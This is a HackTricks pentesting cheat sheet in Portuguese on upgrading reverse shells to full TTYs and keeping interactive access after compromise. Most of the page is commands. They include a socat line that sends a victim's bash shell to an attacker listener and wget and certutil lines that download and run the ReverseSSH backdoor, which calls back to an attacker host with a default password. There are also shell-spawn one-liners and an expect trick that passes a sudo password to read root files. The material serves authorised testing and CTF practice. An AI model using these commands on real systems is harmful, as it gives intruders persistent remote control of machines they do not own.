# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Observe que o shell que você define na variável `SHELL` **deve** estar **listado dentro** de _**/etc/shells**_ ou `O valor da variável SHELL não foi encontrado no arquivo /etc/shells. Este incidente foi relatado`. Além disso, note que os próximos trechos funcionam apenas no bash. Se você estiver em um zsh, mude para um bash antes de obter o shell executando `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Você pode obter o **número** de **linhas** e **colunas** executando **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Uma maneira conveniente para **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é colocar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.

Abaixo está um exemplo para `x86` com binários comprimidos com upx. Para outros binários, verifique a [página de lançamentos](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepare localmente para capturar a solicitação de encaminhamento de porta ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Alvo Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Alvo Windows 10 (para versões anteriores, ver [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Se o pedido de encaminhamento de porta ReverseSSH foi bem-sucedido, você deve agora conseguir fazer login com a senha padrão `letmeinbrudipls` no contexto do usuário que está executando `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) atualiza automaticamente shells reversas do Linux para TTY, gerencia o tamanho do terminal, registra tudo e muito mais. Também fornece suporte a readline para shells do Windows.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Sem TTY

Se por algum motivo você não conseguir obter um TTY completo, você **ainda pode interagir com programas** que esperam entrada do usuário. No exemplo a seguir, a senha é passada para `sudo` para ler um arquivo:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
